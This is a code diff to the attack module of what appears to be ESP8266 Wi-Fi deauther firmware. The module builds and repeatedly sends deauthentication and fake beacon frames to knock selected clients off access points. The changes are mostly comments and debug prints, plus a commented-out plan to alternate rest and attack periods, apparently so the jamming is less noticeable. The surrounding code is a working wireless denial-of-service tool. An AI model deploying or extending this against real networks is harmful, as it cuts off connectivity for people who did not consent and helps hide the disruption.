@@ -1,3 +1,7 @@
+/**
+ * Class to  handle the attacks(deauth, beacon and probe)
+ * 
+ */
 #include "Attack.h"
 
 Attack::Attack() {
@@ -19,6 +23,9 @@ void Attack::generate() {
   macListChangeCounter = 0;
 }
 
+/**
+ * 
+ */
 void Attack::buildDeauth(Mac _ap, Mac _client, uint8_t type, uint8_t reason) {
   packetSize = 0;
   for (int i = 0; i < sizeof(deauthPacket); i++) {
@@ -38,6 +45,9 @@ void Attack::buildDeauth(Mac _ap, Mac _client, uint8_t type, uint8_t reason) {
   packet[24] = reason;
 }
 
+/**
+ * 
+ */
 void Attack::buildBeacon(Mac _ap, String _ssid, int _ch, bool encrypt) {
   packetSize = 0;
   int ssidLen = _ssid.length();
@@ -134,7 +144,12 @@ void Attack::changeRandom(int num){
   }
 }
 
+/**
+ * @param Mac from - the client device
+ * @param Mac to   - The Wifi router
+ */
 void Attack::sendDeauths(Mac from, Mac to){
+  if (debug)Serial.print("START - sendDeauths - AP("+ to.toString() +") -> Client(" + from.toString()+")");
   for(int i=0;i<settings.attackPacketRate;i++){
     buildDeauth(from, to, 0xc0, settings.deauthReason );
     if(send()) packetsCounter[0]++;
@@ -150,23 +165,41 @@ void Attack::sendDeauths(Mac from, Mac to){
 
 void Attack::run() {
   unsigned long currentMillis = millis();
+  //unsigned int currentMillis = millis();
+    // Random  the two scenario.
+    // 15min rest, 5 mins attack
+    // 10mins rest, 2 mins attack
+    
+//  if(currentMillis - previousMillis >= interval) {
+//    previousMillis = currentMillis;   
+//    if (ledState == LOW)
+//      ledState = HIGH;  // Note that this switches the LED *off*
+//    else
+//      ledState = LOW;   // Note that this switches the LED *on*
+//    digitalWrite(BUILTIN_LED, ledState);
+//    Serial.println(" Mili: " + currentMillis);
+//  }
 
+ 
   /* =============== Deauth Attack =============== */
   if (isRunning[0] && currentMillis - prevTime[0] >= 1000) {
     if (debug) Serial.print("running " + (String)attackNames[0] + " attack...");
     prevTime[0] = millis();
 
+     
     for (int a = 0; a < apScan.results; a++) {
       if (apScan.isSelected(a)) {
         Mac _ap;
         int _ch = apScan.getAPChannel(a);
         _ap.set(apScan.aps._get(a));
-
+      
         wifi_set_channel(_ch);
-
+        
         int _selectedClients = 0;
+        //if (debug) Serial.print("\tAttack AP " + (String)attackNames[0] + " Channel: " + _ch);
         
         for (int i = 0; i < clientScan.results; i++) {
+          
           if (clientScan.getClientSelected(i)) {
             _selectedClients++;
             /*if (settings.channelHop) {
@@ -181,6 +214,7 @@ void Attack::run() {
               }
             } else {*/
               sendDeauths(_ap, clientScan.getClientMac(i));
+              
             //}
           }
         }
@@ -260,7 +294,7 @@ void Attack::run() {
   if((isRunning[1] || isRunning[2]) && randomMode && currentMillis - randomTime >= 1000){
     randomTime = millis();
     if(randomCounter >= randomInterval){
-      if(debug) Serial.println(" generate random SSIDs");
+      if(debug) Serial.println("generate random SSIDs");
       ssidList.clear();
       ssidList._random();
       randomCounter = 0;
@@ -272,6 +306,7 @@ void Attack::run() {
 }
 
 void Attack::start(int num) {
+  Serial.println("Attack::start - START");
   Serial.println(num);
   if(!isRunning[num]) {
     Serial.println(num);
@@ -281,11 +316,13 @@ void Attack::start(int num) {
     attackTimeoutCounter[num] = 0;
     refreshLed();
     if (debug) Serial.println("starting " + (String)attackNames[num] + " attack...");
-    if (num == 0) attackMode_deauth = "STOP";
-    else if(num == 1) attackMode_beacon = "STOP";
+    
+    if (num==0) attackMode_deauth = "STOP";
+    else if(num==1) attackMode_beacon = "STOP";
+    
     if(!settings.multiAttacks){
-      for (int i = 0; i < attacksNum; i++){
-        if(i != num) stop(i);
+      for (int i=0; i<attacksNum; i++){
+        if(i!=num)stop(i);
       }
     }
   }else stop(num);
@@ -293,9 +330,9 @@ void Attack::start(int num) {
 
 void Attack::stop(int num) {
   if(isRunning[num]) {
-    if (debug) Serial.println("stopping " + (String)attackNames[num] + " attack...");
-    if (num == 0) attackMode_deauth = "START";
-    else if(num == 1) attackMode_beacon = "START";
+    if (debug) Serial.println("stopping "+(String)attackNames[num] + " attack...");
+    if (num==0) attackMode_deauth="START";
+    else if(num==1) attackMode_beacon="START";
     isRunning[num] = false;
     prevTime[num] = millis();
     refreshLed();
